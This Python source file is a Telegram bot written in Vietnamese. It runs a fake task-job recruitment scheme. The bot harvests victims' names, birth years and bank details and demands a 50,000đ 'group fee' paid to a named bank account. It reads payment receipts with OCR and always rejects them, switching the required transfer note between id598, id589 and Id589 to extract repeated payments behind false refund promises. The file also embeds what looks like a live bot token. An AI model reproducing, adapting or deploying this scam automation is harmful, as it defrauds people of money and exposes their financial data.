
import re
import pytesseract
import asyncio
from PIL import Image
import os
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackQueryHandler, ContextTypes

user_state = {}

pytesseract.pytesseract.tesseract_cmd = r"C:\Program Files\Tesseract-OCR\tesseract.exe"

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.message.chat_id
    user_state[chat_id] = {"step": "initial"}
    keyboard = [
        [InlineKeyboardButton("📋 Đăng ký ngay", callback_data="register")],
        [InlineKeyboardButton("ℹ️ Tìm hiểu thêm", callback_data="learn_more")]
    ]
    await update.message.reply_text("""👋 Xin chào Anh/Chị,
Đây là tin nhắn tự động từ hệ thống của công ty hợp tác cùng các sàn Thương mại Điện tử. Hiện tại, chúng em đang tuyển thành viên tham gia làm nhiệm vụ trên ứng dụng.
✨ Gần đây, công ty cũng triển khai chương trình đăng ký cộng tác viên với phần thưởng khởi động hấp dẫn 420.000đ.
❓ Anh/Chị có quan tâm và muốn tham gia không ạ?""", reply_markup=InlineKeyboardMarkup(keyboard))

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    chat_id = query.message.chat_id
    await query.answer()

    if query.data == "learn_more":
        keyboard = [[InlineKeyboardButton("📋 Đăng ký ngay", callback_data="register")]]
        await query.message.reply_text("""Công việc này rất linh hoạt và có thể kiếm được thu nhập cao. Cụ thể, Anh/Chị sẽ nhận được:
✅ Lương cứng: 300.000 VNĐ/ngày
✅ Hoa hồng: 15% cho mỗi đơn hàng thành công
✅ Tổng thu nhập có thể lên đến 9.000.000 VNĐ/tháng (chưa kể tiền hoa hồng)
👉 Để đạt được mục tiêu, Anh/Chị chỉ cần bán được trên 10 đơn hàng mỗi tháng.
Bên em sẽ cung cấp cho bạn đầy đủ công cụ và hỗ trợ để giúp Anh/Chị""", reply_markup=InlineKeyboardMarkup(keyboard))
    elif query.data == "register":
        user_state[chat_id] = {"step": "waiting_for_info"}
        await query.message.reply_text("Vui lòng nhập họ tên và năm sinh của Anh/Chị theo định dạng: Họ và tên + Năm sinh (ví dụ : Nguyễn Văn A 1995)")
    elif query.data == "agree_terms":
        user_state[chat_id]["step"] = "confirm_terms"
        keyboard = [[InlineKeyboardButton("✅ Đồng ý", callback_data="final_agree")]]
        await query.message.reply_text("""⚠️ Xin lưu ý quan trọng:
Các bước tiếp theo sẽ liên quan đến thông tin tài chính và thanh toán.
Để đảm bảo an toàn & bảo mật, vui lòng cân nhắc kỹ lưỡng trước khi tiếp tục.

Hệ thống sẽ tự động hướng dẫn Anh/chị qua từng bước một cách an toàn, minh bạch và dễ hiểu.""", reply_markup=InlineKeyboardMarkup(keyboard))
    elif query.data == "final_agree":
        user_state[chat_id]["step"] = "waiting_for_info_details"
        await query.message.reply_text("""📩 Yêu cầu cung cấp thông tin thanh toán lương

Để thuận tiện cho việc chuyển khoản lương, vui lòng gửi lại thông tin ngân hàng của bạn trong một tin nhắn duy nhất theo mẫu sau:

 • Tên ngân hàng
 • Số tài khoản ngân hàng
 • Tên chủ tài khoản

Ví dụ:
MB Bank
0123456789
Nguyễn Văn A

Nếu có bất kỳ thắc mắc nào, vui lòng liên hệ với quản lý qua Telegram: @quanlyngocnhu để được hỗ trợ kịp thời.
Xin cảm ơn sự hợp tác của bạn!""")
    elif query.data == "confirm_correct":
        user_state[chat_id]["step"] = "waiting_for_photo"
        sent_msg = await query.message.reply_text("""Hướng dẫn nhận thưởng và tham gia nhóm làm việc

Bước đầu tiên:
Nhiệm vụ của bên em là hướng dẫn các CTV mới nhận ưu đãi lần đầu trị giá 420.000₫. Sau khi hoàn thành, anh chị sẽ được vào nhóm chính để tiếp tục thực hiện nhiệm vụ hàng ngày

💵Phần thưởng điểm danh lần đầu:
 • Số tiền 420.000₫ sẽ được chuyển trực tiếp về tài khoản ngân hàng cá nhân của anh chị ngay sau khi hoàn thành các bước đăng ký và xác nhận

Cách tham gia nhóm:
Anh chị cần nạp 50.000₫ để được vào nhóm và tiếp tục công việc
 • Sau khi nạp, anh chị sẽ nhận ngay 420.000₫ thưởng nhiệm vụ đầu tiên, được chuyển thẳng về tài khoản ngân hàng
 • Những ngày tiếp theo, anh chị làm nhiệm vụ và nhận lương bình thường mà không cần đóng thêm phí

💳 Thông tin chuyển khoản:
 • Ngân hàng: MB Bank
 • Số tài khoản: 17155667788
 • Tên : DUONG TUAN DAT




Lưu ý:
 • Chụp lại hóa đơn giao dịch và gửi ngay sau khi nạp tiền.
 • Chờ từ 1-3 phút để kế toán xác nhận.

Có thắc gì mắc xin liên hệ cho tài khoản của Quản lý : @quanlyngocnhu""")
        user_state[chat_id]["last_msg_id"] = sent_msg.message_id
    elif query.data == "reenter_info":
        user_state[chat_id]["step"] = "waiting_for_info_details"
        await query.message.reply_text("""💳 Mời Anh/Chị nhập lại thông tin ngân hàng để nhận lương""")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.message.chat_id
    text = update.message.text.strip()

    if chat_id not in user_state:
        await start(update, context)
        return

    state = user_state[chat_id]["step"]

    # --- Nhắc nhở khi đang chờ ảnh ---
    if state == "waiting_for_photo":
        await update.message.reply_text("📩 Sau khi thanh toán, vui lòng gửi bill vào đây để kiểm tra. Nếu có thắc mắc, liên hệ quản lý qua Telegram: @quanlyngocnhu.")
        return
    elif state in ["waiting_for_photo_2", "waiting_for_photo_3", "waiting_for_photo_4"]:
        await update.message.reply_text("📩 Sau khi thanh toán, vui lòng gửi bill vào đây để kiểm tra. Nếu có thắc mắc, liên hệ quản lý qua Telegram: @quanlyngocnhu.")
        return

    # --- Xử lý các step thông tin ---
    if state == "waiting_for_info":
        parts = text.rsplit(" ", 1)
        if len(parts) != 2 or not parts[1].isdigit():
            await update.message.reply_text("Thông tin không hợp lệ, vui lòng nhập lại.")
            return

        name, birth_year = " ".join(parts[0].split()), int(parts[1])
        if birth_year < 1945 or birth_year > 2025:
            await update.message.reply_text("Tuổi không hợp lệ, vui lòng thử lại.")
            return
        if birth_year >= 2010:
            await update.message.reply_text("Chưa đủ tuổi để tham gia, vui lòng nhập lại.")
            return

        user_state[chat_id] = {"step": "confirm_terms", "name": name}
        keyboard = [[InlineKeyboardButton("✅ Đồng ý với tất cả các điều khoản trên", callback_data="agree_terms")]]
        await update.message.reply_text(f"""Chào {name}
Để bắt đầu công việc, ứng viên cần đáp ứng các điều kiện cơ bản sau:
 • Độ tuổi: Từ 16 đến dưới 80 tuổi
 • Thời gian làm việc: Mỗi ngày dành 1 – 1,5 giờ cho công việc
 • Yêu cầu tài khoản ngân hàng: Cần có tài khoản ngân hàng cá nhân để nhận lương
(📌 Bạn có thể đọc kỹ nội quy và các điều khoản tại: https://bit.ly/4aJ0mE6)""", reply_markup=InlineKeyboardMarkup(keyboard))

    elif state == "waiting_for_info_details":
        lines = text.split("\n")
        if len(lines) != 3:
            await update.message.reply_text("Thông tin không hợp lệ, vui lòng nhập lại.")
            return

        name = " ".join(lines[0].split())
        age = lines[1].strip()
        province = " ".join(lines[2].split())

        if not age.isdigit():
            await update.message.reply_text("Số tài khoản không hợp lệ, vui lòng nhập lại.")
            return
        if not re.match(r"^[A-Za-zÀ-Ỹà-ỹ\s]+$", name):
            await update.message.reply_text("Tên không hợp lệ, vui lòng nhập lại.")
            return
        if not re.match(r"^[A-Za-zÀ-Ỹà-ỹ\s]+$", province):
            await update.message.reply_text("Tên ngân hàng không hợp lệ, vui lòng nhập lại.")
            return

        user_state[chat_id]["step"] = "confirm_info"
        keyboard = [
            [InlineKeyboardButton("✅ Xác nhận đúng thông tin", callback_data="confirm_correct")],
            [InlineKeyboardButton("🔄 Nhập lại", callback_data="reenter_info")]
        ]
        await update.message.reply_text("""⚠️ Lưu ý quan trọng ⚠️
Nếu nhập sai thông tin ngân hàng, tiền lương và tiền thưởng dành cho Cộng Tác Viên sẽ không thể được chuyển.
Hãy chắc chắn rằng bạn đã nhập đúng và đầy đủ thông tin trước khi gửi.""", reply_markup=InlineKeyboardMarkup(keyboard))



async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.message.chat_id
    photo = update.message.photo[-1]
    file = await context.bot.get_file(photo.file_id)
    file_path = f"{chat_id}_photo.jpg"
    await file.download_to_drive(file_path)

    try:
        img = Image.open(file_path)
        text = pytesseract.image_to_string(img, lang="vie")
        original_text = text.strip()  # giữ nguyên để so sánh bước 4
        cleaned_text = text.lower()    # dùng cho các bước 1-3
        step = user_state.get(chat_id, {}).get("step", "waiting_for_photo")

        # Bước 1
        if step == "waiting_for_photo":
            if "duong tuan dat" in cleaned_text or "dương tuấn đạt" in cleaned_text:
                last_msg_id = user_state.get(chat_id, {}).get("last_msg_id")
                if last_msg_id:
                    await update.message.reply_text("""⏳ Anh/Chị vui lòng chờ trong giây lát để hệ thống kiểm tra.
Nếu có thắc mắc, xin liên hệ qua Telegram: @quanlyngocnhu hoặc hotline: 0388 188 655 (5.000vnđ/phút) để được hỗ trợ.""")
                    await asyncio.sleep(10)
                    await update.message.reply_text("""⚠️ Thông báo từ hệ thống
    Sau khi kiểm tra, hiện chưa ghi nhận giao dịch nào khớp với nội dung chuyển khoản được cung cấp.
    Lưu ý: Hệ thống hoạt động hoàn toàn tự động, nên nếu thiếu hoặc sai nội dung chuyển khoản, giao dịch sẽ không thể nhận diện.
    Vui lòng kiểm tra lại đã khớp với nội dung chuyển khoản đã cung cấp ở trên hay chưa (ở dòng Lưu ý)""")
                    await context.bot.edit_message_text(chat_id=chat_id, message_id=last_msg_id, text="""Hướng dẫn nhận thưởng và tham gia nhóm làm việc

Bước đầu tiên:
Nhiệm vụ của bên em là hướng dẫn các CTV mới nhận ưu đãi lần đầu trị giá 420.000₫. Sau khi hoàn thành, anh chị sẽ được vào nhóm chính để tiếp tục thực hiện nhiệm vụ hàng ngày

💵Phần thưởng điểm danh lần đầu:
 • Số tiền 420.000₫ sẽ được chuyển trực tiếp về tài khoản ngân hàng cá nhân của anh chị ngay sau khi hoàn thành các bước đăng ký và xác nhận

Cách tham gia nhóm:
Anh chị cần nạp 50.000₫ để được vào nhóm và tiếp tục công việc
 • Sau khi nạp, anh chị sẽ nhận ngay 420.000₫ thưởng nhiệm vụ đầu tiên, được chuyển thẳng về tài khoản ngân hàng
 • Những ngày tiếp theo, anh chị làm nhiệm vụ và nhận lương bình thường mà không cần đóng thêm phí

💳 Thông tin chuyển khoản:
 • Ngân hàng: MB Bank
 • Số tài khoản: 17155667788
 • Tên : DUONG TUAN DAT




Lưu ý:
 • Chụp lại hóa đơn giao dịch và gửi ngay sau khi nạp tiền.
 • Nội dung chuyển khoản: id598
 • Chờ từ 1-3 phút để kế toán xác nhận.

Có thắc gì mắc xin liên hệ cho tài khoản của Quản lý : @quanlyngocnhu""")
                await asyncio.sleep(8)
                await update.message.reply_text("""Do hệ thống bên em hoạt động hoàn toàn tự động, nên giao dịch trước chưa có nội dung chính xác sẽ không được ghi nhận.
Để xử lý, Anh/Chị vui lòng thực hiện lại giao dịch với nội dung đúng.
Ngay sau khi xác nhận, hệ thống sẽ tự động hoàn trả số tiền trước đó, tổng cộng Anh/Chị nhận lại 470.000đ.
Mong Anh/Chị thông cảm và phối hợp giúp bên em ạ.
Nếu có thắc mắc, xin liên hệ qua Telegram: @quanlyngocnhu hoặc hotline: 0388 188 655 (5.000vnđ/phút) để được hỗ trợ.""")
                user_state[chat_id]["step"] = "waiting_for_photo_2"
            else:
                await update.message.reply_text("""⏳ Anh/Chị vui lòng chờ trong giây lát để hệ thống kiểm tra.
    Nếu có thắc mắc, xin liên hệ qua Telegram: @quanlyngocnhu hoặc hotline: 0388 188 655 (5.000vnđ/phút) để được hỗ trợ.""")
                await asyncio.sleep(3)
                await update.message.reply_text("""⛔ Hệ thống không tìm thấy bill trùng khớp. Vui lòng kiểm tra lại thông tin giao dịch và gửi đúng bill để hệ thống xác nhận tự động ạ.""")
        # Bước 2
        elif step == "waiting_for_photo_2":
            if "598" in cleaned_text:
                last_msg_id = user_state.get(chat_id, {}).get("last_msg_id")
                if last_msg_id:
                    await context.bot.edit_message_text(chat_id=chat_id, message_id=last_msg_id, text="""Hướng dẫn nhận thưởng và tham gia nhóm làm việc

Bước đầu tiên:
Nhiệm vụ của bên em là hướng dẫn các CTV mới nhận ưu đãi lần đầu trị giá 420.000₫. Sau khi hoàn thành, anh chị sẽ được vào nhóm chính để tiếp tục thực hiện nhiệm vụ hàng ngày

💵Phần thưởng điểm danh lần đầu:
 • Số tiền 420.000₫ sẽ được chuyển trực tiếp về tài khoản ngân hàng cá nhân của anh chị ngay sau khi hoàn thành các bước đăng ký và xác nhận

Cách tham gia nhóm:
Anh chị cần nạp 50.000₫ để được vào nhóm và tiếp tục công việc
 • Sau khi nạp, anh chị sẽ nhận ngay 420.000₫ thưởng nhiệm vụ đầu tiên, được chuyển thẳng về tài khoản ngân hàng
 • Những ngày tiếp theo, anh chị làm nhiệm vụ và nhận lương bình thường mà không cần đóng thêm phí

💳 Thông tin chuyển khoản:
 • Ngân hàng: MB Bank
 • Số tài khoản: 17155667788
 • Tên : DUONG TUAN DAT




Lưu ý:
 • Chụp lại hóa đơn giao dịch và gửi ngay sau khi nạp tiền.
 • Nội dung chuyển khoản: id589
 • Chờ từ 1-3 phút để kế toán xác nhận.

Có thắc gì mắc xin liên hệ cho tài khoản của Quản lý : @quanlyngocnhu""")
                await update.message.reply_text("""⏳ Anh/Chị vui lòng đợi hệ thống kiểm tra.
📌 Nếu cần hỗ trợ, liên hệ @quanlyngocnhu hoặc 0388 188 655 (5.000vnđ/phút).""")
                await asyncio.sleep(15)
                await update.message.reply_text("⛔ Hệ thống vừa kiểm tra và xác nhận không có giao dịch nào trùng khớp. Có khả năng nội dung chuyển khoản đã bị nhập sai, thay vì 589 thì lại thành 598.")
                await asyncio.sleep(3)
                await context.bot.send_photo(chat_id=chat_id, photo=open("step2_fail.jpg", "rb"))
                await update.message.reply_text("📋 Đây là danh sách cộng tác viên đã đăng ký gần đây, bên kế toán vừa xuất ra từ hệ thống ạ.")
                await asyncio.sleep(3)
                await update.message.reply_text("""Dạ bên em làm việc theo hệ thống tự động ạ. Hiện tại cách duy nhất để xử lý là anh vui lòng chuyển lại giao dịch một lần nữa. Sau khi hệ thống xác nhận thành công, anh sẽ được hoàn trả đầy đủ số tiền trước đó.
 • Tổng số tiền anh nhận về sau khi hoàn tất thủ tục là 520.000 VNĐ ạ. Mong anh thông cảm giúp bên em
Nếu có gì thắc mắc vui lòng liên hệ qua Telegram: @quanlyngocnhu hoặc hotline: 0388 188 655 (5.000vnđ/phút) để được hỗ trợ.""")
                user_state[chat_id]["step"] = "waiting_for_photo_3"
            else:
                await update.message.reply_text("""⏳ Anh/Chị vui lòng chờ trong giây lát để hệ thống kiểm tra.
    Nếu có thắc mắc, xin liên hệ qua Telegram: @quanlyngocnhu hoặc hotline: 0388 188 655 để được hỗ trợ.""")
                await asyncio.sleep(3)
                await update.message.reply_text("""⛔ Hệ thống không tìm thấy bill trùng khớp. Vui lòng kiểm tra lại thông tin giao dịch và gửi đúng bill để hệ thống xác nhận tự động ạ.""")


        # Bước 3
        elif step == "waiting_for_photo_3":
            if "id" in original_text and "Id" not in original_text:   # chỉ có "id" (i thường)
                user_state[chat_id]["last_id_case"] = "id"  # <-- thêm dòng này
                last_msg_id = user_state.get(chat_id, {}).get("last_msg_id")
                if last_msg_id:
                    await context.bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=last_msg_id,
                        text="""Hướng dẫn nhận thưởng và tham gia nhóm làm việc

Bước đầu tiên:
Nhiệm vụ của bên em là hướng dẫn các CTV mới nhận ưu đãi lần đầu trị giá 420.000₫. Sau khi hoàn thành, anh chị sẽ được vào nhóm chính để tiếp tục thực hiện nhiệm vụ hàng ngày

💵Phần thưởng điểm danh lần đầu:
• Số tiền 420.000₫ sẽ được chuyển trực tiếp về tài khoản ngân hàng cá nhân của anh chị ngay sau khi hoàn thành các bước đăng ký và xác nhận

Cách tham gia nhóm:
Anh chị cần nạp 50.000₫ để được vào nhóm và tiếp tục công việc
• Sau khi nạp, anh chị sẽ nhận ngay 420.000₫ thưởng nhiệm vụ đầu tiên, được chuyển thẳng về tài khoản ngân hàng
• Những ngày tiếp theo, anh chị làm nhiệm vụ và nhận lương bình thường mà không cần đóng thêm phí

💳 Thông tin chuyển khoản:
• Ngân hàng: MB Bank
• Số tài khoản: 17155667788
• Tên : DUONG TUAN DAT

Lưu ý:
• Chụp lại hóa đơn giao dịch và gửi ngay sau khi nạp tiền.
• Nội dung chuyển khoản: Id589
• Chờ từ 1-3 phút để kế toán xác nhận.

Có thắc gì mắc xin liên hệ cho tài khoản của Quản lý : @quanlyngocnhu"""
                    )
                await update.message.reply_text(
                    """⏳ Anh/Chị vui lòng chờ trong giây lát để hệ thống tiến hành kiểm tra.
Nếu có bất kỳ thắc mắc nào, xin liên hệ qua Telegram: @quanlyngocnhu hoặc hotline: 0388 188 655 (5.000vnđ/phút) để được hỗ trợ."""
                )
                await asyncio.sleep(15)
                await update.message.reply_text(
                    """Xin lỗi anh/chị, hệ thống đã kiểm tra toàn bộ lịch sử giao dịch nhưng không tìm thấy giao dịch nào có nội dung “Id589”.
Anh/chị vui lòng lưu ý: nội dung cần chính xác là “Id589” (chữ I viết hoa), không phải “id589” (chữ i viết thường)."""
                )
                await asyncio.sleep(6)
                await update.message.reply_text("""Bên em xin lỗi vì sự bất tiện này. Hệ thống đã ghi nhận nhiều trường hợp giao dịch sai nội dung tương tự. Hiện tại, anh vui lòng chuyển khoản lại với nội dung chính xác là “Id589” (chữ I viết hoa). Sau khi kế toán xác nhận, bên em sẽ hoàn trả số tiền 150.000 VNĐ mà anh đã chuyển sai trước đó. Như vậy, tổng số tiền giao dịch là 570.000 VNĐ.

Để tránh nhầm lẫn, anh vui lòng sao chép trực tiếp nội dung “Id589” khi thực hiện chuyển khoản. Mong anh thông cảm, do mã Unicode của “id589” và “Id589” khác nhau nên hệ thống không thể nhận diện nếu có sai lệch chữ hoa – chữ thường.""")
                await asyncio.sleep(10)
                await update.message.reply_text("Nếu Anh/Chị không hài lòng, vui lòng liên hệ qua Telegram: @quanlyngocnhu hoặc hotline: 0388 188 655 (5.000vnđ/phút) để được giải quyết.")
                user_state[chat_id]["step"] = "waiting_for_photo_4"

            elif "Id" in original_text:   # có "Id" (I hoa)
                user_state[chat_id]["last_id_case"] = "Id"  # <-- thêm dòng này
                await update.message.reply_text(
                    """⏳ Anh/Chị vui lòng chờ trong giây lát để hệ thống tiến hành kiểm tra.
Nếu có bất kỳ thắc mắc nào, xin liên hệ qua Telegram: @quanlyngocnhu hoặc hotline: 0388 188 655 (5.000vnđ/phút) để được hỗ trợ."""
                )
                await asyncio.sleep(15)
                await update.message.reply_text(
                    """Xin lỗi anh/chị, hệ thống đã kiểm tra toàn bộ lịch sử giao dịch nhưng không tìm thấy giao dịch nào có nội dung “id589”.
Anh/chị vui lòng lưu ý: nội dung cần chính xác là “id589” (chữ i viết thường), không phải “Id589” (chữ I viết Hoa)."""
                )
                await asyncio.sleep(6)
                await update.message.reply_text("""Bên em xin lỗi vì sự bất tiện này. Hệ thống đã ghi nhận nhiều trường hợp giao dịch sai nội dung tương tự. Hiện tại, Anh/Chị vui lòng chuyển khoản lại với nội dung chính xác là “id589” (chữ i viết thường). Sau khi kế toán xác nhận, bên em sẽ hoàn trả số tiền 150.000 VNĐ mà Anh/Chị đã chuyển sai trước đó. Như vậy, tổng số tiền giao dịch là 570.000 VNĐ.

Để tránh nhầm lẫn, Anh/Chị vui lòng sao chép trực tiếp nội dung “id589” khi thực hiện chuyển khoản. Mong Anh/Chị thông cảm, do mã Unicode của “id589” và “Id589” khác nhau nên hệ thống không thể nhận diện nếu có sai lệch chữ hoa – chữ thường.""")
                await asyncio.sleep(10)
                await update.message.reply_text("Nếu Anh/Chị không hài lòng, vui lòng liên hệ qua Telegram: @quanlyngocnhu hoặc hotline: 0388 188 655 (5.000vnđ/phút) để được giải quyết.")
                user_state[chat_id]["step"] = "waiting_for_photo_4"

            else:   # trường hợp gửi sai hoặc không đúng định dạng
                await update.message.reply_text(
                    "⛔ Hệ thống không nhận diện được nội dung giao dịch. "
                    "Vui lòng kiểm tra lại bill và gửi lại với đúng nội dung"
                )

        # Bước 4
        elif step == "waiting_for_photo_4":
            expected_case = "Id" if user_state[chat_id].get("last_id_case") == "id" else "id"  # <-- thêm dòng này
            if expected_case in original_text:
                await update.message.reply_text("⏳ Vui lòng chờ 1-2 phút để hệ thống xử lý.")
                await asyncio.sleep(5)
                await update.message.reply_text("✅ Giao dịch đã được ghi nhận.")
            else:
                await update.message.reply_text(
                    "⛔ Nội dung giao dịch chưa đúng: "
                    f"bước này cần '{expected_case}589' để xác nhận. Vui lòng gửi lại bill."
                )



    finally:
        if os.path.exists(file_path):
            os.remove(file_path)





app = Application.builder().token("7955469884:AAHIgByV3yd_mcJz3SW8McMMPIlyHUgzEXs").build()
app.add_handler(CommandHandler("start", start))
app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
app.add_handler(CallbackQueryHandler(button_callback))
app.run_polling()
